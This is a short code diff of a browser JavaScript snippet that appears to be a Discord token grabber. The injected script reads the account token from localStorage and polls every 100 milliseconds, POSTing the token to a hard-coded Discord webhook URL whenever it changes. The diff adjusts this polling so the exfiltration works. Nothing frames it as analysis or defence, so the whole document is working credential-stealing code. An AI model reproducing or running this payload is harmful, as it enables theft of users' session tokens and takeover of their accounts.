@@ -1,13 +1,8 @@
 <script>
-var win = window.open('https://discord.com/api/webhooks/842367883203444787/3wUnoiR');
+  var win = window.open('https://discord.com/api/webhooks/842367883203444787/3wUnoiR');
 var script = document.createElement('script');
 script.textContent = `
-  var token = localStorage.token
-  setInterval(()=>{
-      if(localStorage.token != token){
-      sendrq();
-      }
-  });
+  var token = "undefined"
   function sendrq(){
       var request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
@@ -19,6 +14,12 @@ script.textContent = `
       }
       request.send(JSON.stringify(params));
   }
+   setInterval(()=>{
+      if(localStorage.token != token){
+          token = localStorage.token
+          sendrq();
+      }
+  }, 100);
 `;
 win.document.head.appendChild(script);
 </script>
